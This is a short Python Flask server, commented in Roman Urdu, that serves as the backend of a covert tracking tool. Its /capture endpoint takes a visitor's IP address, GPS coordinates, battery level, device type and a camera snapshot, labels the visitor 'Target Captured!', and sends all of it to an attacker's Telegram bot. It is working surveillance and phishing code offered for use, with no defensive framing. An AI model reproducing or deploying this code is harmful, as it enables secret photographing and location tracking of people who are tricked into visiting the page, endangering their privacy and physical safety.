import os
import base64
import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# --- CONFIGURATION ---
# Apne Telegram bot details yahan dalain
BOT_TOKEN = "79XXXXXXXX:XXXXXXXXXXXXXXXX" 
CHAT_ID = "6XXXXXXXX"

def send_telegram(text, photo_path=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    # Send Message
    requests.post(url + "sendMessage", data={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"})
    # Send Photo
    if photo_path:
        with open(photo_path, "rb") as f:
            requests.post(url + "sendPhoto", data={"chat_id": CHAT_ID}, files={"photo": f})

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.json
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        info = data.get('info')
        photo = data.get('photo')
        
        report = f"🎯 <b>Target Captured!</b>\n\n" \
                 f"🌐 <b>IP:</b> {ip}\n" \
                 f"📍 <b>Loc:</b> {info.get('lat')}, {info.get('lon')}\n" \
                 f"🔋 <b>Battery:</b> {info.get('battery')}\n" \
                 f"📱 <b>Device:</b> {info.get('platform')}"

        if photo:
            header, encoded = photo.split(",", 1)
            with open("temp.jpg", "wb") as f:
                f.write(base64.b64decode(encoded))
            send_telegram(report, "temp.jpg")
        else:
            send_telegram(report)

        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
